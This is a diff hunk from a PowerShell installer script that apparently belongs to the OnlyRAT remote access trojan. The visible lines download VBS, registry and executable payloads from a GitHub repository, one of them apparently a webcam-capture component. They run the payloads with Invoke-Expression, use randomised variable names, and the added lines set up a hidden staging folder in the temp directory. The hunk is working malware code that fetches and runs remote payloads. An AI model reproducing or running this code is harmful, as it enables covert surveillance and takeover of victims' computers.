@@ -48,6 +48,8 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloa
 $gdOjqHVNDKeg = RpLGWiUsIy
 Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/confirm-reg.vbs -OutFile "$gdOjqHVNDKeg.vbs"
 Invoke-Expression "./$irlpLDVsMf.reg"; Invoke-Expression "./$gdOjqHVNDKeg.vbs"
+mkdir $env:temp/bNOEXCxyVp
+Set-Location $env:temp/bNOEXCxyVp
 Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcame.ese -OutFile "UaAIVKpYhR.exe"
 $grOzVTtUmS = RpLGWiUsIy
 Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/confirm-cam.vbs -OutFile "$grOzVTtUmS.vbs"
